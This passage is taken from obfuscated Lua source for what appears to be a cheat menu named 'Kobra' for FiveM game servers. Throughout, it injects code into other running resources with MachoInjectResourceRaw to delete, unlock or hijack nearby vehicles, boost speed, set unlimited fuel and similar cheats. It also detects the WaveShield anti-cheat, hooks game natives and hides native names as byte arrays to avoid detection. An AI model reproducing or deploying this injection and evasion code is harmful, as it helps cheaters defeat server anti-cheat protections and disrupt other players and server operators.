                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end end},{type="button",label="Delete Vehicle",onSelect=function() local v472=0 -0 ;while true do if (v472==(0 -0)) then v12:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v473=0 + 0 ;while true do if (v473==0) then v12:Notify("success","Kobra","Deleted Vehicle",6093 -3093 );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() local v474=0;while true do if (v474==(0 + 0)) then v12:Notify("success","Kobra","Teleported into Vehicle",3000);MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);break;end end end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v475) if v475 then v12:Notify("success","Kobra","Boost Vehicle On",4516 -1516 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end else local v649=0;while true do if (v649==(0 -0)) then v12:Notify("error","Kobra","Boost Vehicle Off",11147 -8147 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v476) local v477=0 -0 ;local v478;local v479;while true do if (v477==(566 -(237 + 329))) then v478=GetResourceState("WaveShield")=="started" ;v479=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v477=1;end if (v477==(3 -2)) then if v476 then if v478 then v12:Notify("success","Kobra","Instant Brakes On",1978 + 1022 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);else v48(v479,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",1642 + 1358 );end elseif v478 then local v980=1124 -(408 + 716) ;while true do if (v980==(0 -0)) then v12:Notify("success","Kobra","Instant Brakes Off",3821 -(344 + 477) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else v48(v479,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",511 + 2489 );end break;end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v480) local v481=0 -0 ;local v482;local v483;while true do if (v481==(0 + 0)) then v482=GetResourceState("WaveShield")=="started" ;v483=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v481=3 -2 ;end if (v481==(1 -0)) then if v480 then if v482 then v12:Notify("success","Kobra","Easy Handling On",3000);MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);else v48(v483,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",3000);end elseif v482 then local v981=0 -0 ;while true do if (v981==(1529 -(508 + 1021))) then v12:Notify("success","Kobra","Easy Handling Off",3000);MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);break;end end else local v982=0 + 0 ;while true do if (v982==(1166 -(228 + 938))) then v48(v483,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3685 -(332 + 353) );break;end end end break;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v484) local v485=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v484 then local v650=0 -0 ;while true do if (v650==(0 + 0)) then v12:Notify("success","Kobra","Rainbow Vehicle On",1505 + 1495 );if (GetResourceState("WaveShield")=="started") then print("souygdfg");v48(v485,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);else v48(v485,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end break;end end else local v651=0 -0 ;while true do if (v651==(423 -(18 + 405))) then v12:Notify("error","Kobra","Rainbow Vehicle Off",1375 + 1625 );if (GetResourceState("WaveShield")=="started") then local v983=0;while true do if (v983==0) then print("swave");v48(v485,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v48(v485,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v486) if v486 then v12:Notify("success","Kobra","Unlimited Fuel On",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);else v12:Notify("error","Kobra","Unlimited Fuel Off",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v487=0;while true do if (v487==0) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
